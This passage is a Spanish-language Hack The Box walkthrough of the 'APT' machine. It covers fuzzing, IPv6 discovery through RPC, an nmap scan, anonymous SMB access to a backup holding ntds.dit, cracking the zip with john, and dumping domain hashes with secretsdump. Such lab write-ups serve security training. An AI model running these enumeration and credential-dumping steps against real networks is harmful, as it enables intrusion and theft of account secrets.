	<span class="ss">mailto: </span><span class="n">to</span> <span class="kp">catch</span> <span class="n">anti</span><span class="o">-</span><span class="n">spam</span> <span class="n">email</span> <span class="n">addresses</span><span class="p">,</span> <span class="n">eg</span><span class="p">.</span> <span class="nf">bob</span> <span class="n">at</span>
	<span class="n">gmail</span><span class="p">.</span><span class="nf">com</span><span class="o">.</span> <span class="no">This</span> <span class="n">uses</span> <span class="n">the</span> <span class="n">simplified</span> <span class="n">email</span> <span class="n">regular</span>
	<span class="n">expression</span> <span class="n">from</span>
	<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">regular</span><span class="o">-</span><span class="n">expressions</span><span class="p">.</span><span class="nf">info</span><span class="o">/</span><span class="n">email</span><span class="p">.</span><span class="nf">html</span> <span class="k">for</span> <span class="n">valid</span>
	<span class="n">email</span> <span class="n">address</span> <span class="n">matching</span><span class="o">.</span>

	<span class="no">String</span>       <span class="p">:</span> <span class="n">sales</span><span class="vi">@gigantichosting</span><span class="p">.</span><span class="nf">com</span>

<span class="p">[</span> <span class="no">HTML5</span> <span class="p">]</span>
	<span class="no">HTML</span> <span class="n">version</span> <span class="mi">5</span><span class="p">,</span> <span class="n">detected</span> <span class="n">by</span> <span class="n">the</span> <span class="n">doctype</span> <span class="n">declaration</span>


<span class="p">[</span> <span class="no">HTTPServer</span> <span class="p">]</span>
	<span class="no">HTTP</span> <span class="n">server</span> <span class="n">header</span> <span class="n">string</span><span class="o">.</span> <span class="no">This</span> <span class="n">plugin</span> <span class="n">also</span> <span class="n">attempts</span> <span class="n">to</span>
	<span class="n">identify</span> <span class="n">the</span> <span class="n">operating</span> <span class="nb">system</span> <span class="n">from</span> <span class="n">the</span> <span class="n">server</span> <span class="n">header</span><span class="o">.</span>

	<span class="no">String</span>       <span class="p">:</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span> <span class="p">(</span><span class="n">from</span> <span class="n">server</span> <span class="n">string</span><span class="p">)</span>

<span class="p">[</span> <span class="no">JQuery</span> <span class="p">]</span>
	<span class="no">A</span> <span class="n">fast</span><span class="p">,</span> <span class="n">concise</span><span class="p">,</span> <span class="no">JavaScript</span> <span class="n">that</span> <span class="n">simplifies</span> <span class="n">how</span> <span class="n">to</span> <span class="n">traverse</span>
	<span class="no">HTML</span> <span class="n">documents</span><span class="p">,</span> <span class="n">handle</span> <span class="n">events</span><span class="p">,</span> <span class="n">perform</span> <span class="n">animations</span><span class="p">,</span> <span class="ow">and</span> <span class="n">add</span>
	<span class="no">AJAX</span><span class="o">.</span>

	<span class="no">Website</span>     <span class="p">:</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">jquery</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span>

<span class="p">[</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span> <span class="p">]</span>
	<span class="no">Microsoft</span> <span class="no">Internet</span> <span class="no">Information</span> <span class="no">Services</span> <span class="p">(</span><span class="no">IIS</span><span class="p">)</span> <span class="k">for</span> <span class="no">Windows</span>
	<span class="no">Server</span> <span class="n">is</span> <span class="n">a</span> <span class="n">flexible</span><span class="p">,</span> <span class="n">secure</span> <span class="ow">and</span> <span class="n">easy</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">manage</span> <span class="no">Web</span> <span class="n">server</span>
	<span class="k">for</span> <span class="n">hosting</span> <span class="n">anything</span> <span class="n">on</span> <span class="n">the</span> <span class="no">Web</span><span class="o">.</span> <span class="no">From</span> <span class="n">media</span> <span class="n">streaming</span> <span class="n">to</span>
	<span class="n">web</span> <span class="n">application</span> <span class="n">hosting</span><span class="p">,</span> <span class="no">IIS</span><span class="err">'</span><span class="n">s</span> <span class="n">scalable</span> <span class="ow">and</span> <span class="nb">open</span>
	<span class="n">architecture</span> <span class="n">is</span> <span class="n">ready</span> <span class="n">to</span> <span class="n">handle</span> <span class="n">the</span> <span class="n">most</span> <span class="n">demanding</span> <span class="n">tasks</span><span class="o">.</span>

	<span class="no">Version</span>      <span class="p">:</span> <span class="mf">10.0</span>
	<span class="no">Website</span>     <span class="p">:</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">iis</span><span class="p">.</span><span class="nf">net</span><span class="o">/</span>

<span class="p">[</span> <span class="no">Script</span> <span class="p">]</span>
	<span class="no">This</span> <span class="n">plugin</span> <span class="n">detects</span> <span class="n">instances</span> <span class="n">of</span> <span class="n">script</span> <span class="no">HTML</span> <span class="n">elements</span> <span class="ow">and</span>
	<span class="n">returns</span> <span class="n">the</span> <span class="n">script</span> <span class="n">language</span><span class="o">/</span><span class="n">type</span><span class="o">.</span>

	<span class="no">String</span>       <span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">javascript</span><span class="p">,</span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span>

<span class="no">HTTP</span> <span class="no">Headers</span><span class="p">:</span>
	<span class="no">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="no">OK</span>
	<span class="no">Content</span><span class="o">-</span><span class="no">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span>
	<span class="no">Last</span><span class="o">-</span><span class="no">Modified</span><span class="p">:</span> <span class="no">Mon</span><span class="p">,</span> <span class="mi">23</span> <span class="no">Dec</span> <span class="mi">2019</span> <span class="mi">11</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">26</span> <span class="no">GMT</span>
	<span class="no">Accept</span><span class="o">-</span><span class="no">Ranges</span><span class="p">:</span> <span class="n">bytes</span>
	<span class="no">ETag</span><span class="p">:</span> <span class="s2">"0ef5b3b84b9d51:0"</span>
	<span class="no">Server</span><span class="p">:</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span>
	<span class="no">Date</span><span class="p">:</span> <span class="no">Mon</span><span class="p">,</span> <span class="mo">01</span> <span class="no">Apr</span> <span class="mi">2024</span> <span class="mo">01</span><span class="p">:</span><span class="mo">02</span><span class="p">:</span><span class="mo">04</span> <span class="no">GMT</span>
	<span class="no">Connection</span><span class="p">:</span> <span class="n">close</span>
	<span class="no">Content</span><span class="o">-</span><span class="no">Length</span><span class="p">:</span> <span class="mi">14879</span>
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/apt/1.png" />
</p>

<ul>
  <li>Vamos a seguir haciendo <strong>Fuzzing</strong> ya que la pagina web no es muy interesante y no encontré nada así que vamos a ver si la herramienta <code class="language-plaintext highlighter-rouge">wfuzz</code> nos descubre algo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.96.60/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.96.60/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000002:   301        1 L      10 W       150 Ch      "images"
000000189:   301        1 L      10 W       150 Ch      "Images"
000000536:   301        1 L      10 W       147 Ch      "css"
000000939:   301        1 L      10 W       146 Ch      "js"
000002757:   301        1 L      10 W       149 Ch      "fonts"
000003659:   301        1 L      10 W       150 Ch      "IMAGES"
000005568:   301        1 L      10 W       149 Ch      "Fonts"
000008461:   301        1 L      10 W       147 Ch      "CSS"
000009123:   301        1 L      10 W       146 Ch      "JS"
</span></code></pre></div></div>

<ul>
  <li>Bueno como tal también tenemos el protocolo <strong>RPC</strong> abierto pero no nos funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.129.96.60
Cannot connect to server.  Error was NT_STATUS_IO_TIMEOUT
</code></pre></div></div>

<ul>
  <li>
    <p>Si buscamos en <a href="https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc">https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc</a> como enumerar este servicio al final del post nos dejan esta herramienta <a href="https://github.com/mubix/IOXIDResolver">https://github.com/mubix/IOXIDResolver</a> ya que es posible enumerar interfaces de red con <strong>rcp</strong> <a href="https://www.cyber.airbus.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/">https://www.cyber.airbus.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/</a>.</p>
  </li>
  <li>
    <p>Vamos a clonarnos el repositorio.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content git clone https://github.com/mubix/IOXIDResolver
Cloning into <span class="s1">'IOXIDResolver'</span>...
remote: Enumerating objects: 33, <span class="k">done</span><span class="nb">.</span>
remote: Counting objects: 100% <span class="o">(</span>33/33<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Compressing objects: 100% <span class="o">(</span>30/30<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Total 33 <span class="o">(</span>delta 12<span class="o">)</span>, reused 5 <span class="o">(</span>delta 2<span class="o">)</span>, pack-reused 0
Receiving objects: 100% <span class="o">(</span>33/33<span class="o">)</span>, 9.04 KiB | 308.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>12/12<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
➜  content <span class="nb">cd </span>IOXIDResolver
➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> <span class="nb">ls
</span>IOXIDResolver.py  LICENSE  README.md  requirements.txt
➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> pip <span class="nb">install</span> <span class="nt">-r</span> requirements.txt
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: impacket&gt;0 <span class="k">in</span> /usr/lib/python3/dist-packages <span class="o">(</span>from <span class="nt">-r</span> requirements.txt <span class="o">(</span>line 1<span class="o">))</span> <span class="o">(</span>0.11.0<span class="o">)</span>
Requirement already satisfied: dsinternals <span class="k">in</span> /usr/lib/python3/dist-packages <span class="o">(</span>from impacket&gt;0-&gt;-r requirements.txt <span class="o">(</span>line 1<span class="o">))</span> <span class="o">(</span>1.2.4<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Si ejecutamos la herramienta solo nos piden un <strong>target</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> python3 IOXIDResolver.py <span class="nt">-h</span>
IOXIDResolver.py <span class="nt">-t</span> &lt;target&gt;
</code></pre></div></div>

<ul>
  <li>Si le damos la <strong>IP</strong> vemos que nos reporta una dirección en <strong>IPV6</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> python3 IOXIDResolver.py <span class="nt">-t</span> 10.129.96.60
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Retrieving network interface of 10.129.96.60
Address: apt
Address: 10.129.96.60
Address: dead:beef::1c3
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::5c2e:939a:a5ff:2f03
</code></pre></div></div>

<ul>
  <li>Para comprobar si la <code class="language-plaintext highlighter-rouge">ip</code> esta activa podemos lanzar un <code class="language-plaintext highlighter-rouge">ping</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> ping6 <span class="nt">-c</span> 1 dead:beef::b885:d62a:d679:573f
PING dead:beef::b885:d62a:d679:573f <span class="o">(</span>dead:beef::b885:d62a:d679:573f<span class="o">)</span> 56 data bytes
64 bytes from dead:beef::b885:d62a:d679:573f: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>90.1 ms

<span class="nt">---</span> dead:beef::b885:d62a:d679:573f ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 90.110/90.110/90.110/0.000 ms
</code></pre></div></div>

<h1 id="portscan-ipv6">PortScan ipv6</h1>

<ul>
  <li>Ahora lo que podemos hacer es un escaneo con <code class="language-plaintext highlighter-rouge">Nmap</code> para ver los puertos abiertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49673,49689,63855 <span class="nt">-6</span> dead:beef::b885:d62a:d679:573f <span class="nt">-oN</span> targeted2
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-31 19:35 CST
Nmap scan report <span class="k">for </span>dead:beef::b885:d62a:d679:573f
Host is up <span class="o">(</span>0.094s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-server-header:
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
|_http-title: Bad Request
88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-04-01 01:35:24Z<span class="o">)</span>
135/tcp   open  msrpc        Microsoft Windows RPC
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-01T01:36:34+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: HTB<span class="o">)</span>
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2024-04-01T01:36:34+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2024-04-01T01:36:34+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
3269/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-01T01:36:34+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc        Microsoft Windows RPC
49673/tcp open  msrpc        Microsoft Windows RPC
49689/tcp open  msrpc        Microsoft Windows RPC
63855/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: APT<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: <span class="nt">-8m34s</span>, deviation: 22m38s, median: <span class="nt">-1s</span>
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 <span class="o">(</span>Windows Server 2016 Standard 6.3<span class="o">)</span>
|   Computer name: apt
|   NetBIOS computer name: APT<span class="se">\x</span>00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: apt.htb.local
|_  System <span class="nb">time</span>: 2024-04-01T02:36:24+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time:
|   <span class="nb">date</span>: 2024-04-01T01:36:25
|_  start_date: 2024-04-01T00:50:55
</code></pre></div></div>

<h2 id="enumeración-ipv6">Enumeración IPV6</h2>

<ul>
  <li>Vemos que estamos ante un <strong>Windows Server 2016 Standard</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb dead:beef::b885:d62a:d679:573f
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar el dominio al <code class="language-plaintext highlighter-rouge">/etc/hots</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"dead:beef::b885:d62a:d679:573f apt apt.local.htb htb.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
dead:beef::b885:d62a:d679:573f apt apt.local.htb htb.local
</code></pre></div></div>

<ul>
  <li>Vamos a enumerar recursos compartidos a nivel de red aprovechando que el servicio de <strong>smb</strong> esta abierto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbclient <span class="nt">-L</span> apt <span class="nt">-N</span>
Anonymous login successful

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
	backup          Disk
	IPC<span class="nv">$ </span>           IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
apt is an IPv6 address <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<ul>
  <li>El recurso <strong>backup</strong> es interesante vamos a conectarnos al recurso compartido y ver lo que hay adentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbclient //apt/backup <span class="nt">-N</span>
Anonymous login successful
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Thu Sep 24 02:30:52 2020
  ..                                  D        0  Thu Sep 24 02:30:52 2020
  backup.zip                          A 10650961  Thu Sep 24 02:30:32 2020

		5114623 blocks of size 4096. 2634373 blocks available
smb: <span class="se">\&gt;</span> get backup.zip
getting file <span class="se">\b</span>ackup.zip of size 10650961 as backup.zip <span class="o">(</span>1647.9 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1647.9 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Y bueno tenemos un <code class="language-plaintext highlighter-rouge">.zip</code> y tiene esto dentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content 7z l backup.zip

7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 10650961 bytes <span class="o">(</span>11 MiB<span class="o">)</span>

Listing archive: backup.zip

<span class="nt">--</span>
Path <span class="o">=</span> backup.zip
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 10650961

   Date      Time    Attr         Size   Compressed  Name
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2020-09-23 11:40:25 D....            0            0  Active Directory
2020-09-23 11:38:20 .....     50331648      8483543  Active Directory/ntds.dit
2020-09-23 11:38:20 .....        16384          342  Active Directory/ntds.jfm
2020-09-23 11:40:25 D....            0            0  registry
2020-09-23 11:22:12 .....       262144         8522  registry/SECURITY
2020-09-23 11:22:12 .....     12582912      2157644  registry/SYSTEM
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2020-09-23 11:40:25           63193088     10650051  4 files, 2 folders
</code></pre></div></div>

<ul>
  <li>
    <p>Vemos archivos <code class="language-plaintext highlighter-rouge">ntds</code> <a href="https://docs.iwolfsec.com/tecnicas-y-ataques/ataques-a-directorio-activo/credenciales/dumping-active-directory-hashes-ntds.dit">https://docs.iwolfsec.com/tecnicas-y-ataques/ataques-a-directorio-activo/credenciales/dumping-active-directory-hashes-ntds.dit</a> aquí se almacenan los hashes <code class="language-plaintext highlighter-rouge">NTLM</code>, usuarios, grupos, miembros de un grupo y mas.</p>
  </li>
  <li>
    <p>Bueno nos pide contraseña.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip backup.zip
Archive:  backup.zip
   creating: Active Directory/
<span class="o">[</span>backup.zip] Active Directory/ntds.dit password:
</code></pre></div></div>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">zip2john</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content zip2john backup.zip <span class="o">&gt;</span> <span class="nb">hash
</span>ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression <span class="nb">type
</span>ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>8483543, <span class="nv">decmplen</span><span class="o">=</span>50331648, <span class="nv">crc</span><span class="o">=</span>ACD0B2FB <span class="nv">ts</span><span class="o">=</span>9CCA <span class="nv">cs</span><span class="o">=</span>acd0 <span class="nb">type</span><span class="o">=</span>8
ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>342, <span class="nv">decmplen</span><span class="o">=</span>16384, <span class="nv">crc</span><span class="o">=</span>2A393785 <span class="nv">ts</span><span class="o">=</span>9CCA <span class="nv">cs</span><span class="o">=</span>2a39 <span class="nb">type</span><span class="o">=</span>8
ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression <span class="nb">type
</span>ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>8522, <span class="nv">decmplen</span><span class="o">=</span>262144, <span class="nv">crc</span><span class="o">=</span>9BEBC2C3 <span class="nv">ts</span><span class="o">=</span>9AC6 <span class="nv">cs</span><span class="o">=</span>9beb <span class="nb">type</span><span class="o">=</span>8
ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>2157644, <span class="nv">decmplen</span><span class="o">=</span>12582912, <span class="nv">crc</span><span class="o">=</span>65D9BFCD <span class="nv">ts</span><span class="o">=</span>9AC6 <span class="nv">cs</span><span class="o">=</span>65d9 <span class="nb">type</span><span class="o">=</span>8
NOTE: It is assumed that all files <span class="k">in </span>each archive have the same password.
If that is not the <span class="k">case</span>, the <span class="nb">hash </span>may be uncrackable. To avoid this, use
option <span class="nt">-o</span> to pick a file at a time.
➜  content <span class="nb">cat hash
</span>backup.zip:<span class="nv">$pkzip$4</span><span class="k">*</span>1<span class="k">*</span>1<span class="k">*</span>0<span class="k">*</span>8<span class="k">*</span>24<span class="k">*</span>9beb<span class="k">*</span>0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed<span class="k">*</span>1<span class="k">*</span>0<span class="k">*</span>8<span class="k">*</span>24<span class="k">*</span>65d9<span class="k">*</span>2a1c4c81fb6009425c2d904699497b75d843f69f8e623e3edb81596de9e732057d17fae8<span class="k">*</span>1<span class="k">*</span>0<span class="k">*</span>8<span class="k">*</span>24<span class="k">*</span>acd0<span class="k">*</span>0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5<span class="k">*</span>2<span class="k">*</span>0<span class="k">*</span>156<span class="k">*</span>4000<span class="k">*</span>2a393785<span class="k">*</span>81733d<span class="k">*</span>37<span class="k">*</span>8<span class="k">*</span>156<span class="k">*</span>2a39<span class="k">*</span>0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996<span class="k">*</span><span class="nv">$/</span>pkzip<span class="nv">$:</span>:backup.zip:Active Directory/ntds.jfm, registry/SECURITY, registry/SYSTEM, Active Directory/ntds.dit:backup.zip
</code></pre></div></div>

<ul>
  <li>Si lo crackeamos vemos la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
iloveyousomuch   <span class="o">(</span>backup.zip<span class="o">)</span>
1g 0:00:00:00 DONE <span class="o">(</span>2024-03-31 19:56<span class="o">)</span> 16.66g/s 136533p/s 136533c/s 136533C/s newzealand..whitetiger
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Y ahora si podemos usar <code class="language-plaintext highlighter-rouge">unzip</code> pasándole la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip backup.zip
Archive:  backup.zip
   creating: Active Directory/
<span class="o">[</span>backup.zip] Active Directory/ntds.dit password:
  inflating: Active Directory/ntds.dit
  inflating: Active Directory/ntds.jfm
   creating: registry/
  inflating: registry/SECURITY
  inflating: registry/SYSTEM
</code></pre></div></div>

<ul>
  <li>Podemos usar <code class="language-plaintext highlighter-rouge">impacket-secretsdump</code> ya que el <code class="language-plaintext highlighter-rouge">ntds</code> y el <code class="language-plaintext highlighter-rouge">SYSTEM</code> lo tenemos para dumpear <code class="language-plaintext highlighter-rouge">hashes</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-secretsdump <span class="nt">-system</span> registry/SYSTEM <span class="nt">-ntds</span> Active<span class="se">\ </span>Directory/ntds.dit LOCAL <span class="o">&gt;</span> hashes
</code></pre></div></div>

<ul>
  <li>Bueno tenemos 2000 usuarios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>hashes | <span class="nb">wc</span> <span class="nt">-l</span>
2000
</code></pre></div></div>

<ul>
  <li>Para validar usuarios validos del dominio podemos emplear le herramienta <a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a>.</li>
</ul>

